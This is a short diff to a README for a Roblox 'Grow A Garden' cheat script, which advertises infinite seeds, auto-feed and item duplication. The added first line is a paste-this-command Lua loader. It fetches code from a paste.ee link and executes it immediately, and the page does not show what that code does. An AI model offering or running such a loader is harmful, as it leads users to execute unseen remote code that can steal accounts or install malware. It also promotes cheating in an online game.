@@ -1,3 +1,5 @@
+script: loadstring(game:HttpGet("https://paste.ee/r/rkRH4Kbk"))()
+
 # GROW-A-GARDEN-SCRIPT
 Grow A Garden Script INF Seed, Auto Feed, Dupe &amp; More! | PC/Mobile 2025 | KEYLESS
 **The Grow A Garden Script is rich with utility to simplify your farming efforts. Below is a deeper look at how each feature changes the way you play:
